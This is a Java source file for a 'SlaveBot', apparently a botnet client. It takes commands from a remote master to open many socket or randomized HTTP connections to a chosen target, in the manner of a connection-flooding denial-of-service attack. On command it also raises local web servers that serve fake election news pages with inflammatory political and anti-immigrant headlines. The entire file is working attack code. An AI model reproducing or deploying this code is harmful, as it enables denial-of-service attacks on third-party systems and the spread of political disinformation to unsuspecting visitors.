import java.util.*;
import java.io.IOException;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.net.*;
import java.io.OutputStream;
import java.net.InetSocketAddress;


import com.sun.net.httpserver.HttpExchange;
import com.sun.net.httpserver.HttpHandler;
import com.sun.net.httpserver.HttpServer;

public class SlaveBot {
	
	private int masterPortNo;
	private String masterIPOrHostname;
	ArrayList <HttpServer> servers; 
	ArrayList <Socket> targetList;
	ArrayList <HttpURLConnection> targetHttpList;
	
	public int getMasterPortNo() {
		return masterPortNo;
	}

	public void setMasterPortNo(int masterPortNo) {
		this.masterPortNo = masterPortNo;
	}

	
	public String getMasterIPOrHostname() {
		return masterIPOrHostname;
	}

	public void setMasterIPOrHostname(String IpOrHost) {
		this.masterIPOrHostname = IpOrHost;
	}

	/*
	 * Connecting to a target on a specified port 
	 *
	 */
	public void connectToTarget(String targetIpOrHost, int portnumber, int numConnections, int keepAlive, String url){
		System.out.println("Slave connecting to ip/host" + targetIpOrHost + " port " + portnumber + 
		" num connect " + numConnections);
		String request_url = null;
		String random_q = "";
		Random rand = new Random();
		for(int i = 0; i<numConnections;i++){
			try {
				if (url != null) {
					System.out.println("url:" + url);
					int rand_len = rand.nextInt(10) + 1;
					//System.out.println("random len:" + rand_len);
					for (int j = 0; j < rand_len; j++ ) {
						int ascii_code = (rand.nextInt() % 26) + 97;
						String c = Character.toString((char)ascii_code);
						//System.out.println("char:" + c);
						random_q += c;
					}
					System.out.println("randomq:" + random_q);
					request_url = "https://" + targetIpOrHost + url + random_q;
					System.out.println(request_url);
					try {
						URL attackURL = new URL(request_url);
						HttpURLConnection attackConnection = (HttpURLConnection) attackURL.openConnection();
						attackConnection.setRequestMethod("GET");
						attackConnection.setRequestProperty("User-Agent", "Mozilla/5.0");
						attackConnection.connect();
						BufferedReader in = new BufferedReader(new InputStreamReader(attackConnection.getInputStream()));
						while (in.readLine() != null) {
						}
						// Need to close input stream for keep alive to work
						in.close();
						System.out.flush();
						// Now add this http connection to our list
						targetHttpList.add(attackConnection);
					} catch (MalformedURLException e) {
						e.printStackTrace();
					} catch (IOException e) {
						e.printStackTrace();
					}
				} else {
					Socket tempSocket = new Socket(targetIpOrHost, portnumber);
					if (keepAlive == 1) {
						System.out.println("Switching keepalive ON");
						// For keep alive on a regular socket we need to switch this on
						tempSocket.setKeepAlive(true);
					}
					targetList.add(tempSocket); // Target added to arraylist after connecting
				}
			} catch (IOException e) {
				e.printStackTrace();
			}
		}		
	}
	/*
	 *Disconnecting from target
	 *If port number is 0, disconnect all connections with target
	 */
	public boolean disconnectToTarget(String targetIpOrHost,int portNumber)
	{
		//Validating whether the given target is connected to the slave.
		String targetHostName;
		String[] targetStr;
		String targetIp;
		String port;
		//System.out.println("Disconencting target from slave");
		//System.out.println("List size :" + targetList.size());
		for(Socket targetSoc:targetList){
			 targetHostName = targetSoc.getInetAddress().getHostName();
			 targetStr = targetSoc.getRemoteSocketAddress().toString().split("/");
			
			// System.out.println("Printing target details");
			// for(int i = 0 ; i< targetStr.length ; i++){
			//	 System.out.println("string " + i + ":" + targetStr[i]);
			// }
			 
			 targetStr = targetStr[1].split(":");
			 System.out.println(targetStr[0]);
			 targetIp = targetStr[0];
			 port = targetStr[1];
			 System.out.flush();
			 if(targetHostName.equals(targetIpOrHost)|| targetIp.equalsIgnoreCase(targetIpOrHost)){
				// System.out.println("targetip/host connected to slave");
				 if(portNumber!=0){
					 if(port.equalsIgnoreCase(Integer.toString(portNumber))){
						// System.out.println("Port Found");
						 //closing the connecting and deleting the socket from array list
						 try {
						//	System.out.println("disconnecting....");
							targetSoc.close();
							targetList.remove(targetSoc);
							return true;
						} catch (IOException e) {
							e.printStackTrace();
						}
					 }
					 else{
						 System.err.println("Portnumber not present");
					 }
				 }
				 else{
					 try {
							System.out.println("disconnecting");
							targetSoc.close();
							targetList.remove(targetSoc);
							return true;
						} catch (IOException e) {
							e.printStackTrace();
						}
				 }
			 }
		}
		return false;
	}
	
	
	
	public void downFakeURL(String fakeURL, int portNumber){
		for(HttpServer server : servers){
			if(server.getAddress().getPort() == portNumber){
				server.stop(0);
				servers.remove(server);
				System.out.println("Server stopped and removed from list");
				return;
			}
		}
	}
	
	
	
	
	/*
	 * rise fake url function
	 */
	
	
		
	public void riseFakeURL(String fakeURL, int portNumber){
		System.out.println("Rise Fake URL has been called in Slave bot");
		int count = 0,i = 0;
		String context = "/";
		for(i = 0; i< fakeURL.length();i++){
			if(fakeURL.substring(i, i+1) == "/"){
				count++;
				if(count == 3) break;
			}
		}
		if(count == 3)  context = fakeURL.substring(i);
		
		try {
			
			HttpServer server = HttpServer.create(new InetSocketAddress(portNumber), 0);
			server.createContext(context, new MyHandler());
			server.createContext("/virtualpage1", new virtualPage1());
			server.createContext("/virtualpage2", new virtualPage2());
			server.createContext("/virtualpage3", new virtualPage3());
			server.createContext("/virtualpage4", new virtualPage4());
			server.createContext("/virtualpage5", new virtualPage5());
			server.createContext("/virtualpage6", new virtualPage6());
			server.setExecutor(null);
			server.start();
			servers.add(server);
			//System.out.println(context);
		} catch (IOException e) {
			e.printStackTrace();
		}
		
		
	}
	
	static class MyHandler implements HttpHandler {
		public void handle(HttpExchange t) throws IOException{
			String response = "Rise fake url";
			String response1 = "<html> <title> Election Results </title><body><h1> Exit polls out. Trump is winning.</h1><p><a href=/virtualpage1.html> Click here for more news </a> </p><p><a href=/virtualpage2.html > Click here to know if you are smart </a></p></body></html>";
			t.sendResponseHeaders(200, response1.length());
			OutputStream os = t.getResponseBody();
			os.write(response1.getBytes());
			os.close();
		}
		
	}
	
	
	static class virtualPage1 implements HttpHandler {
		public void handle(HttpExchange t) throws IOException{
			String response = "<html>" + 
								"<title> Trump wins </title><h1> Want to know by how many points Trump is leading?? </h1>"
								+ "<p><a href=/virtualpage3> To know more about Trump click here!! </a></p>"
								+ "<p><a href=/virtualpage4> Is North Korea the real threat!! </a></p>"
								+ "<p><a href=/>check this out 1! </a></p>"
								+ "<p><a href=/>check this out 2! </a></p>"
								+ "<p><a href=/>check this out 3! </a></p>"
								+ "<p><a href=/>check this out 4! </a></p>"
								+ "<p><a href=/>check this out 5! </a></p>"
								+ "<p><a href=/>check this out 6! </a></p>"
								+ "<p><a href=/>check this out 7! </a></p>"
								+ "<p><a href=/>check this out 8! </a></p>"
								+ "<p><a href=/>check this out 9! </a></p>"
								+ "<p><a href=/>check this out 10! </a></p>"
								+ "</html>";
			t.sendResponseHeaders(200, response.length());
			OutputStream os = t.getResponseBody();
			os.write(response.getBytes());
			os.close();
		}		
	}
	
	
	static class virtualPage2 implements HttpHandler {
		public void handle(HttpExchange t) throws IOException{
			String response = "<html><title> Trump wins </title><h1> Smart people are supporting Trump. Are you smart?? </h1>"
					+ "<p><a href=/virtualpage5>GlobalWarming a myth!!</a></p></html>"
					+ "<p><a href=/virtualpage6>America!! the land of Americans</a></p></html>"
					+ "<p><a href=../>check this out 1! </a></p></html>"
					+ "<p><a href=../>check this out 2! </a></p></html>"
					+ "<p><a href=../>check this out 3! </a></p></html>"
					+ "<p><a href=../>check this out 4! </a></p></html>"
					+ "<p><a href=../>check this out 5! </a></p></html>"
					+ "<p><a href=../>check this out 6! </a></p></html>"
					+ "<p><a href=../>check this out 7! </a></p></html>"
					+ "<p><a href=../>check this out 8! </a></p></html>"
					+ "<p><a href=../>check this out 9! </a></p></html>"
					+ "<p><a href=../>check this out 10! </a></p>"
					+ "</html>";
			
			t.sendResponseHeaders(200, response.length());
			OutputStream os = t.getResponseBody(); 
			os.write(response.getBytes());
			os.close();
		}
		
	}
	
	static class virtualPage3 implements HttpHandler {
	public void handle(HttpExchange t) throws IOException{
		String response = "<html>" + 
				"<title> Trump wins </title><h1> Want to know more about Trump?? Click the links below </h1>"
				+ "<p><a href=/>check this out 1! </a></p>"
				+ "<p><a href=/>check this out 2! </a></p>"
				+ "<p><a href=/>check this out 3! </a></p>"
				+ "<p><a href=/>check this out 4! </a></p>"
				+ "<p><a href=/>check this out 5! </a></p>"
				+ "<p><a href=/>check this out 6! </a></p>"
				+ "<p><a href=/>check this out 7! </a></p>"
				+ "<p><a href=/>check this out 8! </a></p>"
				+ "<p><a href=/>check this out 9! </a></p>"
				+ "<p><a href=/>check this out 10! </a></p>"
				+ "</html>";
		t.sendResponseHeaders(200, response.length());
		OutputStream os = t.getResponseBody();
		os.write(response.getBytes());
		os.close();
		}		
	}
	
	static class virtualPage4 implements HttpHandler {		
		public void handle(HttpExchange t) throws IOException{
			String response = "<html>" + 
					"<title> Trump wins </title><h1> North Korea the real threat. Know more!!! </h1>"
					+ "<p><a href=/>check this out 1! </a></p>"
					+ "<p><a href=/>check this out 2! </a></p>"
					+ "<p><a href=/>check this out 3! </a></p>"
					+ "<p><a href=/>check this out 4! </a></p>"
					+ "<p><a href=/>check this out 5! </a></p>"
					+ "<p><a href=/>check this out 6! </a></p>"
					+ "<p><a href=/>check this out 7! </a></p>"
					+ "<p><a href=/>check this out 8! </a></p>"
					+ "<p><a href=/>check this out 9! </a></p>"
					+ "<p><a href=/>check this out 10! </a></p>"
					+ "</html>";
			t.sendResponseHeaders(200, response.length());
			OutputStream os = t.getResponseBody();
			os.write(response.getBytes());
			os.close();
		}		
	}
	
	static class virtualPage5 implements HttpHandler {
		public void handle(HttpExchange t) throws IOException{
			String response = "<html>" + 
					"<title> Trump wins </title><h1> Global warming just a myth?? </h1>"
					+ "<p><a href=/>check this out 1! </a></p>"
					+ "<p><a href=/>check this out 2! </a></p>"
					+ "<p><a href=/>check this out 3! </a></p>"
					+ "<p><a href=/>check this out 4! </a></p>"
					+ "<p><a href=/>check this out 5! </a></p>"
					+ "<p><a href=/>check this out 6! </a></p>"
					+ "<p><a href=/>check this out 7! </a></p>"
					+ "<p><a href=/>check this out 8! </a></p>"
					+ "<p><a href=/>check this out 9! </a></p>"
					+ "<p><a href=/>check this out 10! </a></p>"
					+ "</html>";
			t.sendResponseHeaders(200, response.length());
			OutputStream os = t.getResponseBody();
			os.write(response.getBytes());
			os.close();
		}		
	}
	static class virtualPage6 implements HttpHandler {
		public void handle(HttpExchange t) throws IOException{
			String response = "<html>" + 
								"<title> Trump wins </title><h1> Immigrants go back to your country. See for more news </h1>"
								+ "<p><a href=/>check this out 1! </a></p>"
								+ "<p><a href=/>check this out 2! </a></p>"
								+ "<p><a href=/>check this out 3! </a></p>"
								+ "<p><a href=/>check this out 4! </a></p>"
								+ "<p><a href=/>check this out 5! </a></p>"
								+ "<p><a href=/>check this out 6! </a></p>"
								+ "<p><a href=/>check this out 7! </a></p>"
								+ "<p><a href=/>check this out 8! </a></p>"
								+ "<p><a href=/>check this out 9! </a></p>"
								+ "<p><a href=/>check this out 10! </a></p>"
								+ "</html>";
			t.sendResponseHeaders(200, response.length());
			OutputStream os = t.getResponseBody();
			os.write(response.getBytes());
			os.close();
		}		
	}



	/*
	 * Connecting slave to master and communicating
	 */
	public void connectToMaster(){
		try {
			boolean flag;
			Socket s = new Socket(masterIPOrHostname, masterPortNo);
			targetList = new ArrayList<Socket>();
			servers = new ArrayList<HttpServer>();
			targetHttpList = new ArrayList<HttpURLConnection>();
			System.out.println("Sucessfully connected");
			BufferedReader input = new BufferedReader(new InputStreamReader(s.getInputStream()));
			String data = input.readLine();
			while (data != null) {
				System.out.println("Slave got data from server: " + data);
				System.out.flush();
				String cmd[] = data.split(":");
				String url = null;
				System.out.println("length of cmds: " + cmd.length);
				//If connect command is given by master
				if(cmd[0].equalsIgnoreCase("connect")){
					String targetIpOrHost = cmd[1];
					int portNumber = Integer.parseInt(cmd[2]);
					int numberOfConnection = Integer.parseInt(cmd[3]);
					int keepAlive = Integer.parseInt(cmd[4]);
					if (cmd.length > 5) {
						// One extra cmd is for  the url
						url = cmd[5];
					}
					connectToTarget(targetIpOrHost, portNumber, numberOfConnection, keepAlive, url);
					System.out.println("Successfully connected to target ");
					System.out.flush();
				}
				else if(cmd[0].equalsIgnoreCase("disconnect")){
					System.out.println("Data Recieved in Slave");
					int portNumber = 0;
					String targetIpOrHost = cmd[1];
					if(cmd.length == 3){
						portNumber = Integer.parseInt(cmd[2]);
					}
					System.out.println("Disconnect target Ip:" + targetIpOrHost + " target port:" + portNumber);
					do{
						flag = disconnectToTarget(targetIpOrHost,portNumber);
					//	System.out.println(" disconnect loop");
					//	System.out.flush();
					}while(flag==true);
					//System.out.println("Successfully disconnected from target ");
					//System.out.flush();					
				}
				else if(cmd[0].equalsIgnoreCase("rise-fake-url")){
					System.out.println("rise-fake-url command received in slave");
					int portNumber = Integer.parseInt(cmd[1]);
					String fakeUrl = cmd[2];
					riseFakeURL(fakeUrl, portNumber);
				}
				else if(cmd[0].equalsIgnoreCase("down-fake-url")){
					System.out.println("down-fake-url command received in slave");
					int portNumber = Integer.parseInt(cmd[1]);
					String fakeUrl = cmd[2];
					downFakeURL(fakeUrl, portNumber);
				}
				
				// Read the next line
				data = input.readLine();
			}
		} catch(IOException e) {
			e.printStackTrace();
	}
}
	public static void main(String[] args) {
		// TODO Auto-generated method stub
		
		SlaveBot slave = new SlaveBot();
		//Getting the command line arguments
		if(args.length == 0){
			System.err.println("Command to enter master hostname or ip address must be included");
			System.exit(1);
		}
		else{
			if(args.length == 4){
				if((args[0].equals("-h"))&& (args[1].length() > 5) && (args[2].equals("-p"))&&(Integer.parseInt(args[3])>0)){
					slave.setMasterIPOrHostname(args[1]);
					slave.setMasterPortNo(Integer.parseInt(args[3]));
					slave.connectToMaster();
					
				}
				else{
					System.err.println("Invalid Command. Command must be of form -b Ip/Hostname -p portnumber");
					System.exit(1);
				}
			}
			else{
				System.err.println("Invalid Command. Command must be of form -h Ip/Hostname -p portnumber");
				System.exit(1);
			}
		}

	}

}
